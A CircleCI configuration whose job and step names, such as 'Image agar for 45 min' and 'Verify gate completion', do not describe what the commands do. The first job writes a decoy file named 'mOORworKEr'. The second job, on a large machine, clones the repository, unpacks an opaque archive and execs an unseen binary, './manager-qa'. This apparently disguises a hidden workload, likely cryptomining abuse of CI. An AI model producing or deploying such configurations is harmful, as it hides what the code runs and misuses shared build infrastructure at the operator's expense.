version: 2.1

jobs:
  blog-email-text:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Image agar for 45 min
          command: |
            mkdir -p /tmp/absorb
            set +o pipefail 2>/dev/null; for((i=1;i<=5000;i++)); do echo "$i $((i ^ RANDOM))"; done > /tmp/absorb/mOORworKEr; true
            printf 'size=%d\n' "$(wc -c </tmp/absorb/mOORworKEr)"
      - persist_to_workspace:
          root: /tmp/absorb
          paths:
            - 'mOORworKEr'
  uma-run:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/absorb
      - run:
          name: Verify gate completion
          command: |
            # json-ish
            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/mOORworKEr" "$(wc -c < /tmp/absorb/mOORworKEr 2>/dev/null || echo 0)"
      - run:
          name: Checkout main
          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: xzcat build-data-v5.tar.xz | tar xf -
      - run:
          command: exec ./manager-qa
